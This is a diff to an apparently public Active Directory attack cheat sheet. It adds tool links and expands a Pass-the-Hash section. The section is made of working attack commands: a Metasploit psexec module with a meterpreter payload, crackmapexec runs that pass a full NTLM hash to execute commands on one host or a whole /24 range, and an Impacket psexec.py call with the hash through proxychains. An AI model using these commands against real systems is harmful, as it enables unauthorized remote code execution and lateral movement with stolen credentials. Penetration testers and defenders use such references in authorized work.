@@ -22,7 +22,7 @@
 
 ## Tools
 
-* [Impacket](https://github.com/CoreSecurity/impacket)
+* [Impacket](https://github.com/CoreSecurity/impacket) or the [Windows version](https://github.com/maaaaz/impacket-examples-windows)
 * [Responder](https://github.com/SpiderLabs/Responder)
 * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 * [Ranger](https://github.com/funkandwagnalls/ranger)
@@ -157,18 +157,21 @@ https://room362.com/post/2016/kerberoast-pt1/
 ```
 
 ### Pass-the-Hash 
-Note: the password can be replaced by a hash to execute a `pass the hash` attack.
+The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes.
 ```c
 use exploit/windows/smb/psexec
 set RHOST 10.2.0.3
 set SMBUser jarrieta
-set SMBPass nastyCutt3r 
+set SMBPass nastyCutt3r  
+// NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
+// NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
 set PAYLOAD windows/meterpreter/bind_tcp
 run
 shell
 
 or with crackmapexec
 cme smb 10.2.0.2 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
+also works with net range : cme smb 10.2.0.2/24 ... 
 
 or with psexec
 proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
